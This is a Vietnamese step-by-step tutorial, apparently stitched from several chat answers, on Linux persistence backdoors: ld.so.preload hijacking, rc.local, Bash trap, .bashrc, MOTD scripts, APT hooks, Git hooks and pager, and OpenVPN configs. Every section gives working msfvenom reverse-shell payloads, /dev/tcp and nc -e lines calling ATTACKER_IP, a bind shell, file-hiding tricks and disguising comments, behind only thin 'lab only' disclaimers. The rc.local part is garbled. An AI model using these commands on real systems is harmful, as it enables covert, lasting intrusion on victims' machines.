### Kỹ thuật Dynamic Linker Hijacking để Duy trì Quyền Truy Cập (Persistence) trên Linux

Dynamic Linker Hijacking là một kỹ thuật persistence nâng cao, thường được sử dụng trong phát triển rootkit trên Linux. Kỹ thuật này lợi dụng cơ chế dynamic linker (ld.so hoặc ld-linux.so.*) để tải một thư viện chia sẻ (.so) độc hại trước khi bất kỳ chương trình nào chạy, từ đó thực thi mã độc mỗi khi có tiến trình mới được khởi tạo.

#### Có cần sinh payload bằng msfvenom không?
**Không cần thiết**.  
Msfvenom thường dùng để tạo payload độc lập (ví dụ: reverse shell Meterpreter), nhưng trong kỹ thuật này, chúng ta chỉ cần một thư viện chia sẻ (.so) đơn giản được biên dịch từ mã C bằng GCC. Ví dụ bạn đưa ra đã đủ để thực thi một script backdoor. Nếu muốn payload phức tạp hơn (như Meterpreter), bạn có thể nhúng payload từ msfvenom vào .so, nhưng điều đó làm tăng độ phức tạp và không cần thiết cho mục đích cơ bản.

#### Tổng quan kỹ thuật
1. Tạo một file thư viện chia sẻ (.so) độc hại bằng C.
2. Biên dịch nó với các flag đặc biệt.
3. Thêm đường dẫn file .so vào `/etc/ld.so.preload` (yêu cầu quyền root).
4. Mỗi khi bất kỳ chương trình nào chạy (kể cả `ls`, `ps`, `id`...), thư viện độc hại sẽ được tải trước và thực thi mã của bạn.

**Lưu ý quan trọng**:  
- Kỹ thuật này chỉ dùng cho mục đích học tập, kiểm thử xâm nhập (pentest) trong môi trường được phép.  
- Việc áp dụng trên hệ thống thực mà không có sự cho phép là bất hợp pháp.

#### Hướng dẫn thực hiện từng bước

**Bước 1: Chuẩn bị mã nguồn C (preload.c)**  
Tạo file `preload.c` với nội dung sau:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Xóa biến môi trường để tránh vòng lặp hoặc bị phát hiện
    setresuid(0, 0, 0);      // Đặt UID về root (nếu đang chạy với quyền root)
    system("/opt/backdoor.sh");  // Thực thi script backdoor của bạn
}
```

> Bạn có thể thay `/opt/backdoor.sh` bằng lệnh bất kỳ, ví dụ:
> - `system("nc -e /bin/sh attacker_ip 4444");` để mở reverse shell
> - Hoặc gọi một binary backdoor khác.

**Bước 2: Biên dịch thành file .so**  
Chạy lệnh sau (yêu cầu có gcc):

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Giải thích các flag:
- `-fPIC`: Position Independent Code (bắt buộc cho shared object)
- `-shared`: Tạo thư viện chia sẻ
- `-nostartfiles`: Không liên kết với startup code chuẩn
- `-o /tmp/preload.so`: Đặt tên và vị trí file output (có thể đặt ở bất kỳ đâu có quyền ghi)

Sau lệnh này, bạn sẽ có file `/tmp/preload.so`.

**Bước 3: Thêm vào file preload hệ thống**  
Yêu cầu quyền root:

```bash
echo "/tmp/preload.so" >> /etc/ld.so.preload
```

> Lưu ý: Đường dẫn phải là tuyệt đối (bắt đầu bằng `/`), và không có dấu ngoặc kép trong file.

**Bước 4: Kiểm tra hoạt động**  
- Thoát session hiện tại và đăng nhập lại (hoặc mở terminal mới).
- Chạy bất kỳ lệnh nào, ví dụ:

```bash
ls
id
whoami
```

→ Mỗi lần chạy, script `/opt/backdoor.sh` sẽ được thực thi với quyền của tiến trình (thường là quyền người dùng đang chạy lệnh).  
Nếu tiến trình chạy với quyền root (ví dụ lệnh `sudo`), thì backdoor cũng chạy với quyền root.

**Bước 5: Tạo script backdoor (ví dụ /opt/backdoor.sh)**  
Tạo file script đơn giản để kiểm tra:

```bash
#!/bin/bash
# Ví dụ reverse shell đơn giản
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &

# Hoặc ghi log để kiểm tra
echo "$(date) - Preload executed by $(whoami)" >> /tmp/.preload_log
```

Đừng quên:

```bash
chmod +x /opt/backdoor.sh
```

**Bước 6: Dọn dẹp (khi không muốn persistence nữa)**

```bash
# Xóa dòng chứa preload.so khỏi file
sed -i '/preload.so/d' /etc/ld.so.preload

# Xóa file .so
rm /tmp/preload.so
```

#### Ưu điểm và hạn chế
**Ưu điểm**:
- Rất khó phát hiện nếu đặt file .so ở vị trí ẩn.
- Thực thi trên hầu hết các tiến trình (trừ những binary static hoặc setuid đặc biệt).

**Hạn chế**:
- Yêu cầu quyền root để ghi vào `/etc/ld.so.preload`.
- Một số hệ thống hiện đại (SELinux, AppArmor) có thể chặn.
- Dễ gây crash hệ thống nếu mã C lỗi.
- Antivirus/EDR hiện đại có thể phát hiện hành vi bất thường.

Nếu bạn cần ví dụ nâng cao hơn (ví dụ hook hàm như `fork`, `execve` để ẩn process), hãy cho mình biết!

**rc.local**
Kiểm tra xem có generator hỗ trợ rc.local không:

Bashls /usr/lib/systemd/system-generators/systemd-rc-local-generator 2>/dev/null && echo "Có hỗ trợ" || echo "Không có hỗ trợ"

Nếu output Có hỗ trợ → Hệ thống có thể chạy rc.local (nếu file tồn tại và executable).
Nếu Không → Không hỗ trợ nữa (ví dụ Arch Linux).

Bước 1: Tạo payload bằng msfvenom\
Bashmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/backdoor.elf

Bước 2: Tạo file /etc/rc.local: sudo nano /etc/rc.local
```
#!/bin/sh -e

# Chạy payload ngầm
/var/tmp/.bd &

exit 0
```

Bước 3: Làm file executable
Bashsudo chmod +x /etc/rc.local

Bước 4: Kiểm tra và kích hoạt
Systemd tự động detect và chạy nếu file executable.
Kiểm tra status (nếu có rc-local.service):
sudo systemctl status rc-local.serviceF

Bước 6: Reboot victim:
sudo reboot

Dọn dẹp
rm /var/tmp/.bd
rm /etc/rc.local
reboot


### Kỹ thuật Persistence bằng Bash Trap (MITRE ATT&CK T1546.005 - Event Triggered Execution: Trap)

**Trap** trong Bash là lệnh dùng để bắt (catch) các signal (như SIGINT khi nhấn Ctrl+C, SIGTERM khi kill process, hoặc pseudo-signal **EXIT** khi script/shell thoát).  

Thường dùng để cleanup (xóa file tạm, log exit...), nhưng **có thể abuse cho persistence**: Khi shell/script thoát (do logout, kill, reboot một phần...), trap sẽ thực thi lệnh độc hại (ví dụ chạy payload msfvenom) ở background, giúp tái kết nối.

**Lưu ý quan trọng**:
- Đây là kỹ thuật **event-triggered persistence**, không phải luôn chạy khi boot như rc.local hay cron.
- Chỉ hoạt động khi có shell interactive/non-interactive bị thoát.
- **Stealth thấp**: EDR (CrowdStrike, Elastic...) detect dễ vì sửa ~/.bashrc hoặc trap bất thường.
- Chỉ cho mục đích học tập/pentest trong lab được phép.

#### Cách phổ biến abuse Trap cho Persistence
Thường thêm vào file **~/.bashrc** hoặc **~/.bash_profile** (chạy khi mở shell mới):
- Dùng **trap 'malicious_command' EXIT**: Khi shell thoát, lệnh chạy.
- Chạy ngầm với `&` hoặc `nohup` để không bị kill theo parent.

#### Hướng dẫn thực hiện với Payload msfvenom

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF reverse shell (Linux x64 phổ biến):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/backdoor.elf
```

- Upload file này lên victim (ví dụ `/var/tmp/.bd` để ẩn).
- Làm executable: `chmod +x /var/tmp/.bd`

Nếu muốn reverse shell đơn giản (không Meterpreter):

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /var/tmp/.bd
```

**Bước 2: Thêm Trap vào file profile**  
Yêu cầu quyền user (không cần root nếu persistence cho user đó).

Sửa file `~/.bashrc` (hoặc `~/.profile`, `~/.bash_login`):

```bash
echo 'trap "/var/tmp/.bd &" EXIT' >> ~/.bashrc
```

Hoặc chi tiết hơn (chạy ngầm, không để lại trace):

```bash
echo 'trap "nohup /var/tmp/.bd > /dev/null 2>&1 &" EXIT' >> ~/.bashrc
```

- `nohup`: Cho phép chạy ngay cả khi shell chết.
- `> /dev/null 2>&1`: Ẩn output.

**Bước 3: Làm trap chạy trước mọi lệnh (nâng cao hơn - dùng DEBUG)**  
Để payload chạy **trước mỗi lệnh** user gõ (rất persistent nếu user active):

```bash
echo 'trap "/var/tmp/.bd &" DEBUG' >> ~/.bashrc
```

- DEBUG signal chạy trước mỗi command → payload gọi liên tục (nhưng dễ detect vì traffic nhiều).

**Bước 4: Thiết lập listener trên attacker**

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit -j  # Chạy background để catch nhiều session
```

**Bước 5: Kiểm tra**  
- Mở shell mới (hoặc logout/login lại).
- Thoát shell (`exit` hoặc Ctrl+D) → trap kích hoạt → nhận session Meterpreter.

Nếu dùng DEBUG: Gõ bất kỳ lệnh nào (ls, id...) → payload chạy ngay.

#### Stealth của kỹ thuật này?
- **Thấp đến trung bình**:  
  - Sửa ~/.bashrc dễ detect bằng auditd, EDR (file modification monitoring).  
  - Traffic reverse shell đều đặn nếu dùng DEBUG.  
  - Atomic Red Team có test cụ thể detect trap persistence.  
- Để tăng stealth:  
  - Ẩn payload ở /dev/shm/ hoặc encode.  
  - Dùng trap chỉ EXIT, không DEBUG.  
  - Kết hợp với kỹ thuật khác (cron, systemd).

#### Dọn dẹp
```bash
sed -i '/trap.*bd/d' ~/.bashrc
rm /var/tmp/.bd
```

### Kỹ thuật Backdooring User Startup File (Persistence qua ~/.bashrc, ~/.profile, v.v.)

Đây là một trong những kỹ thuật **persistence** cơ bản và phổ biến nhất trên Linux, thuộc MITRE ATT&CK **T1546.004 - Event Triggered Execution: Unix Shell Configuration Modification**.

**Nguyên lý**:  
Các file như `~/.bashrc`, `~/.bash_profile`, `~/.profile` được Bash tự động chạy khi:
- Mở terminal mới (non-login shell: ~/.bashrc).
- Login shell (SSH, su, login: ~/.bash_profile hoặc ~/.profile).

Bằng cách thêm lệnh độc hại vào các file này, payload (ví dụ reverse shell từ msfvenom) sẽ thực thi **mỗi khi user mở terminal hoặc login**.

**Ưu điểm**:  
- Không cần root (chỉ cần quyền user).  
- Rất phổ biến, khó bị nghi ngờ nếu thêm dòng lệnh "vô hại" trông giống script.

**Nhược điểm**:  
- Chỉ chạy khi user mở terminal/login (không chạy nếu user không active).  
- Dễ bị detect bởi EDR (file modification monitoring) hoặc kiểm tra thủ công.

#### Hướng dẫn thực hiện với Payload msfvenom

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF reverse shell (phù hợp Linux x64):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/.backdoor
```

```bash
mv /tmp/.backdoor /home/$USER/.cache/.bd
chmod +x /home/$USER/.cache/.bd
```

(Ẩn trong `~/.cache` để trông giống file tạm).

**Bước 2: Thêm lệnh vào file startup**  
Chọn một trong các file sau (thường dùng `~/.bashrc` vì chạy nhiều nhất):

```bash
# 1. Thêm vào ~/.bashrc (chạy mỗi terminal mới)
echo 'nohup /home/$USER/.cache/.bd > /dev/null 2>&1 &' >> ~/.bashrc
```

Hoặc chi tiết hơn (ẩn output, chạy ngầm):

```bash
cat << EOF >> ~/.bashrc
# Auto-start backdoor (added for debugging)
nohup /home/$USER/.cache/.bd >/dev/null 2>&1 &
EOF
```

**Bước 3: Các file startup khác (tùy trường hợp)**  
Nếu muốn chạy khi login (SSH, console):

- `~/.bash_profile` (ưu tiên nếu tồn tại):

```bash
echo 'nohup /home/$USER/.cache/.bd > /dev/null 2>&1 &' >> ~/.bash_profile
```

- `~/.profile` (dùng nếu không có bash_profile):

```bash
echo 'nohup /home/$USER/.cache/.bd > /dev/null 2>&1 &' >> ~/.profile
```

**Bước 4: Kích hoạt (test)**  
- Đăng xuất và đăng nhập lại (hoặc mở terminal mới).
- Hoặc chạy:

```bash
source ~/.bashrc
```

→ Payload sẽ chạy và bạn nhận session Meterpreter trên listener.

#### Để tăng stealth
- **Ẩn payload**:
  - Đặt ở `/home/$USER/.config/`, `/dev/shm/`, hoặc encode bằng UPX.
- **Tránh trace**:
  - Dùng `nohup` + redirect output.
  - Thêm comment giả: `# Temporary debug line`.
- **Kết hợp với trap** (như câu hỏi trước):
  - Thêm `trap 'nohup /home/$USER/.cache/.bd &' EXIT` vào cùng file.

#### Dễ bị phát hiện như thế nào?
- EDR (CrowdStrike, Elastic, Microsoft Defender for Endpoint) detect:
  - Modification file profile (~/.bashrc).
  - Process spawn từ ~/.bashrc.
- Kiểm tra thủ công:
  ```bash
  grep -i "nohup" ~/.bashrc ~/.bash_profile ~/.profile
  ```
- Atomic Red Team có test cụ thể cho kỹ thuật này.

#### Dọn dẹp
```bash
sed -i '/\.bd/d' ~/.bashrc ~/.bash_profile ~/.profile
rm /home/$USER/.cache/.bd
```

#### Kết luận
Đây là kỹ thuật **rất phổ biến trong pentest** vì dễ thực hiện, không cần quyền root, và hoạt động tốt trên hầu hết user interactive.  
Tuy nhiên, trong môi trường có monitoring (2025), EDR dễ phát hiện nếu thêm dòng lạ vào file startup.  
Nếu muốn stealth hơn, cân nhắc kết hợp với **systemd user service** (chạy cho user, không cần root) hoặc **cron @reboot**.


### Kỹ thuật Persistence qua MOTD Backdooring (Message of the Day)

**MOTD Backdooring** là kỹ thuật persistence lợi dụng cơ chế hiển thị **Message of the Day** khi user SSH/login vào hệ thống Linux (chủ yếu Ubuntu/Debian-based, năm 2025 vẫn hoạt động trên Ubuntu 24.04+).  

Các script trong `/etc/update-motd.d/` được thực thi **mỗi khi user login qua SSH** (qua PAM module `pam_motd.so`), tạo MOTD động. Attacker thêm lệnh độc hại vào một script ở đây → payload chạy mỗi lần có user SSH vào, mở reverse shell.

**MITRE ATT&CK**: Thường classify là **T1037 (Boot or Logon Initialization Scripts)** hoặc liên quan **T1546 (Event Triggered Execution)**.

**Lưu ý quan trọng**:  
- Chỉ cho mục đích học tập/pentest trong môi trường được phép.  
- Yêu cầu **quyền root**.  
- **Stealth thấp**: EDR (Elastic, CrowdStrike) detect dễ (modification /etc/update-motd.d/, network connection từ root khi SSH).  
- Payload chạy với quyền **root** (nếu SSH bằng user thường), nhưng phải chạy ngầm để không block login.

#### Hướng dẫn thực hiện với Payload msfvenom (nâng cao hơn one-liner bash)

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF Meterpreter reverse TCP (x64 phổ biến):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/.motd_bd
```

- Upload lên victim (ví dụ `/var/tmp/.motd_bd` để ẩn).
- Làm executable:

```bash
chmod +x /var/tmp/.motd_bd
```

**Bước 2: Chọn hoặc tạo script trong /etc/update-motd.d/**  
Các script mặc định: `00-header`, `10-help-text`, `50-motd-news`, v.v.  
Chỉnh sửa một script hiện có (ví dụ `00-header`) hoặc tạo mới (ví dụ `99-backdoor` để chạy cuối):

```bash
sudo nano /etc/update-motd.d/99-backdoor
```

Nội dung (chạy payload ngầm, không block login):

```bash
#!/bin/sh

# Chạy payload ngầm với nohup/setsid để detach hoàn toàn
nohup setsid /var/tmp/.motd_bd > /dev/null 2>&1 &

# (Tùy chọn) In ra MOTD giả để che giấu
echo "Welcome to the system!"
```

Hoặc nếu muốn one-liner đơn giản (không dùng binary):

```bash
#!/bin/sh
nohup setsid bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > /dev/null 2>&1 &
```

**Bước 3: Làm script executable**

```bash
sudo chmod +x /etc/update-motd.d/99-backdoor
```

**Bước 4: Thiết lập listener trên attacker**

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit -j
```

**Bước 5: Kiểm tra**  
- Từ máy khác, SSH vào victim (dùng user bất kỳ).
- Payload sẽ chạy ngay → bạn nhận session Meterpreter.

Mỗi lần có user SSH mới → session mới (nếu listener chạy background).

#### Stealth của kỹ thuật này năm 2025?
- **Thấp**:  
  - Modification file hệ thống (/etc/update-motd.d/) bị EDR detect ngay (file integrity monitoring).  
  - Network connection bất thường từ root khi login.  
  - Elastic Security Labs có rule cụ thể detect MOTD persistence + egress connection.  
- Để tăng stealth một chút:  
  - Tạo file mới với tên giống mặc định (ví dụ `90-custom`).  
  - Dùng payload encoded hoặc fetch từ remote (curl).  
  - Nhưng vẫn dễ bị threat hunting (kiểm tra /etc/update-motd.d/*).

#### Dọn dẹp
```bash
sudo rm /etc/update-motd.d/99-backdoor
rm /var/tmp/.motd_bd
# Reboot hoặc SSH lại để kiểm tra
```


### Kỹ thuật Persistence qua APT Hooks Backdooring (Debian/Ubuntu-based)

**APT Hooks Backdooring** là kỹ thuật persistence lợi dụng cơ chế **hooks** của APT (Advanced Packaging Tool) trên các distro Debian-based (Ubuntu, Debian...).  

APT cho phép chạy lệnh tùy chỉnh trước/sau các hành động như `apt update`, `apt upgrade`, `apt install`... qua cấu hình trong `/etc/apt/apt.conf.d/`. Attacker thêm hook độc hại → payload chạy **mỗi khi admin/user chạy lệnh apt** (thường xuyên trên server), mở reverse shell với quyền root (vì apt thường chạy sudo).

**Hook phổ biến nhất**: `APT::Update::Pre-Invoke` – chạy trước `apt update`.

**Lưu ý quan trọng**:  
- Chỉ cho mục đích học tập/pentest trong môi trường được phép.  
- Yêu cầu **quyền root**.  
- **Stealth thấp đến trung bình**: EDR (Elastic, CrowdStrike, Microsoft Defender) detect dễ (modification /etc/apt/apt.conf.d/, network connection bất thường khi apt chạy). Nhiều bài phân tích malware/rootkit (PANIX, 2024-2025) detect kỹ thuật này.  
- Chỉ hoạt động trên hệ thống dùng APT (Debian/Ubuntu).

#### Hướng dẫn thực hiện với Payload msfvenom

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF Meterpreter reverse TCP (x64 phổ biến):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/.apt_bd
```

- Upload lên victim (ví dụ `/var/tmp/.apt_bd` để ẩn).
- Làm executable:

```bash
chmod +x /var/tmp/.apt_bd
```

**Bước 2: Tạo file hook trong /etc/apt/apt.conf.d/**  
File tên bất kỳ, nhưng nên bắt đầu bằng số cao (ví dụ `99-backdoor`) để chạy cuối (APT đọc file theo thứ tự alphanumeric).

```bash
sudo nano /etc/apt/apt.conf.d/99-backdoor
```

Nội dung (chạy payload ngầm, không block apt):

```conf
APT::Update::Pre-Invoke { "nohup setsid /var/tmp/.apt_bd > /dev/null 2>&1 &" };
```

Hoặc nếu muốn bind shell (nghe trên port):

```conf
APT::Update::Pre-Invoke { "nohup ncat -lvp 4444 -e /bin/bash > /dev/null 2>&1 &" };
```

**Bước 3: Thiết lập listener trên attacker**

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit -j
```

**Bước 4: Kiểm tra**  
- Trên victim, chạy lệnh apt bất kỳ (thường cần sudo):

```bash
sudo apt update
# Hoặc sudo apt upgrade, sudo apt install ...
```

→ Hook kích hoạt → bạn nhận session Meterpreter với quyền root.

Mỗi lần chạy apt → session mới.

#### Các hook khác có thể dùng
- `APT::Update::Post-Invoke` – chạy sau update.
- `DPkg::Pre-Invoke` – chạy trước dpkg (install/remove).

#### Stealth năm 2025?
- **Thấp**:  
  - Tạo/sửa file trong /etc/apt/apt.conf.d/ bị EDR detect ngay (file integrity monitoring).  
  - Connection bất thường khi apt chạy (thường không có network từ apt).  
- Để tăng stealth một chút:  
  - Đặt file tên giống hệ thống (ví dụ `70-custom`).  
  - Payload fetch từ remote thay binary local.  
  - Nhưng vẫn dễ bị threat hunting (kiểm tra `ls /etc/apt/apt.conf.d/`).

#### Dọn dẹp
```bash
sudo rm /etc/apt/apt.conf.d/99-backdoor
rm /var/tmp/.apt_bd
# Chạy apt update để kiểm tra không còn trigger
```


### Kỹ thuật Persistence qua Git Backdooring (Hooks & Config)

**Git Backdooring** là kỹ thuật persistence lợi dụng **Git hooks** hoặc **Git config** trên máy nạn nhân có repository Git (rất phổ biến ở developer, DevOps, server CI/CD).  

Payload sẽ chạy **mỗi khi dev thực hiện hành động Git** (commit, log...), mở reverse shell – thường với quyền user đang dùng Git.

**MITRE ATT&CK**: T1546.004 (Unix Shell Configuration Modification) hoặc T1574 (Hijack Execution Flow).

**Lưu ý quan trọng**:  
- Chỉ cho mục đích học tập/pentest trong môi trường được phép.  
- **Không cần root** (chỉ cần quyền user có repo Git).  
- **Stealth trung bình**: Dễ bị dev phát hiện nếu kiểm tra `.git/hooks` hoặc `.git/config`, nhưng EDR ít monitor repo cá nhân → khó detect hơn so với /etc/.

#### 2 cách chính: Git Hooks và Git Config (Pager)

#### Cách 1: Git Hooks (Pre-commit – phổ biến nhất)

**Nguyên lý**: Hooks nằm trong `.git/hooks/`, chạy tự động theo sự kiện (pre-commit, post-commit, pre-push...).

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF Meterpreter (x64):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/.git_bd
```

Upload lên victim (ví dụ `~/.cache/.git_bd`):

```bash
chmod +x ~/.cache/.git_bd
```

**Bước 2: Tạo hook pre-commit**  
Vào repo bất kỳ (hoặc tạo repo mới):

```bash
cd /path/to/your/repo
nano .git/hooks/pre-commit
```

Nội dung (chạy ngầm, không block commit):

```bash
#!/bin/sh

# Git pre-commit backdoor
nohup ~/.cache/.git_bd > /dev/null 2>&1 &

# (Tùy chọn) In ra thông báo giả để che giấu
echo "Running pre-commit checks..."
```

**Bước 3: Làm executable**

```bash
chmod +x .git/hooks/pre-commit
```

**Bước 4: Kiểm tra**  
Thêm file và commit:

```bash
echo "test" >> test.txt
git add test.txt
git commit -m "test commit"
```

→ Hook chạy → bạn nhận session Meterpreter.

#### Cách 2: Git Config (Pager Abuse – GIT_PAGER)

**Nguyên lý**: Git dùng pager (less/more) để hiển thị output dài (git log, git diff...). Nếu set `core.pager` thành lệnh độc hại + pager thật → lệnh độc hại chạy mỗi lần dùng pager.

**Bước 1: Dùng cùng payload như trên** (`~/.cache/.git_bd`)

**Bước 2: Set pager trong config**  
Có thể set global hoặc per-repo:

- Per-repo (chỉ repo này):

```bash
cd /path/to/repo
git config core.pager "nohup ~/.cache/.git_bd > /dev/null 2>&1 &; less"
```

- Global (tất cả repo của user):

```bash
git config --global core.pager "nohup ~/.cache/.git_bd > /dev/null 2>&1 &; less"
```

Hoặc chỉnh tay file `~/.gitconfig`:

```ini
[core]
    pager = nohup /home/$USER/.cache/.git_bd > /dev/null 2>&1 &; less
```

**Bước 3: Kiểm tra**  
Chạy lệnh dùng pager:

```bash
git log
git diff
git show
```

→ Payload chạy → nhận session.

#### Stealth năm 2025?
- **Trung bình đến cao** trong môi trường dev:  
  - Dev ít kiểm tra `.git/hooks` hoặc `git config --list`.  
  - EDR thường không monitor sâu repo cá nhân.  
  - Rất hiệu quả trên máy dev, CI runner, server có source code.  
- **Dễ bị phát hiện nếu**: Dev chạy `git config --list` hoặc kiểm tra hooks khi clone repo mới.

#### Dọn dẹp
- Hooks:

```bash
rm .git/hooks/pre-commit
# Hoặc rename lại sample: mv .git/hooks/pre-commit.sample .git/hooks/pre-commit
```

- Config:

```bash
git config --unset core.pager  # per-repo
git config --global --unset core.pager  # global
rm ~/.cache/.git_bd
```

### Kỹ thuật Backdooring OpenVPN Configuration (.ovpn file)

**Backdooring OpenVPN** là kỹ thuật persistence/evasion phổ biến, lợi dụng file cấu hình client **.ovpn** để thực thi mã độc hại khi user kết nối VPN.  

Kỹ thuật này dựa vào các directive như **--up**, **--down**, **--route-up**... cho phép chạy script/command khi tunnel được thiết lập (up) hoặc đóng (down). Attacker sửa .ovpn file để thêm payload → chạy reverse shell mỗi khi user connect VPN.

**MITRE ATT&CK**: T1574 (Hijack Execution Flow) hoặc T1546 (Event Triggered Execution).

**Lưu ý quan trọng**:  
- Chỉ cho mục đích học tập/pentest trong môi trường được phép.  
- **Yêu cầu script-security 2** (hoặc cao hơn) trong .ovpn để cho phép chạy script.  
- Nhiều client hiện đại (OpenVPN Connect app, Viscosity, NetworkManager) **disable hoặc restrict** tính năng này năm 2025 để tránh abuse.  
- **Stealth thấp**: EDR detect dễ (execution bất thường khi connect VPN). Không dùng trên production mà không có permission.

#### Hướng dẫn thực hiện với Payload msfvenom

**Bước 1: Tạo payload bằng msfvenom**  
Tạo binary ELF Meterpreter reverse TCP (Linux client phổ biến):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o /tmp/.vpn_bd
```

- Upload payload lên victim (nếu có access trước), ví dụ `/var/tmp/.vpn_bd` hoặc `/home/$USER/.cache/.vpn_bd`.
- Làm executable: `chmod +x /var/tmp/.vpn_bd`

**Bước 2: Sửa file .ovpn để backdoor**  
Attacker cần cung cấp/sửa file .ovpn cho victim (ví dụ qua phishing, supply chain, hoặc modify file hiện có).

Thêm vào cuối file .ovpn (sau các directive chuẩn):

```conf
script-security 2
up "/var/tmp/.vpn_bd"
# Hoặc dùng route-up để chạy sau khi route được add
# route-up "/var/tmp/.vpn_bd"

# Chạy ngầm để không block connect
up "nohup /var/tmp/.vpn_bd > /dev/null 2>&1 &"
```

Hoặc dùng **setenv** để bypass limit 256 chars (nếu payload dài):

```conf
setenv SAFE "/var/tmp/.vpn_bd > /dev/null 2>&1 &"
up "nohup $SAFE"
```

**Bước 3: Thiết lập listener trên attacker**

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit -j
```

**Bước 4: Kiểm tra**  
- Victim import và connect với file .ovpn đã backdoor.
- Khi tunnel up → payload chạy → bạn nhận session Meterpreter (thường quyền user chạy OpenVPN client).

Mỗi lần connect VPN → session mới.

#### Các directive khác có thể abuse
- **down**: Chạy khi disconnect (ít useful cho persistence).
- **route-up/route-down**: Chạy sau/khi route được configure.
- **ipchange**: Chạy khi IP thay đổi.

#### Stealth năm 2025?
- **Thấp**:  
  - Nhiều client (OpenVPN Connect, Ubuntu NetworkManager) ignore hoặc warn về script directives.  
  - EDR (CrowdStrike, Elastic) detect execution từ OpenVPN process.  
  - User dễ thấy nếu inspect .ovpn file.  
- Để tăng stealth:  
  - Dùng binary payload nhỏ, encode (UPX).  
  - Fetch payload từ remote thay local binary.  
  - Nhưng vẫn dễ bị detect nếu victim có security tools.

#### Dọn dẹp (nếu test)
- Xóa directive script-security/up từ .ovpn.
- Xóa payload binary.

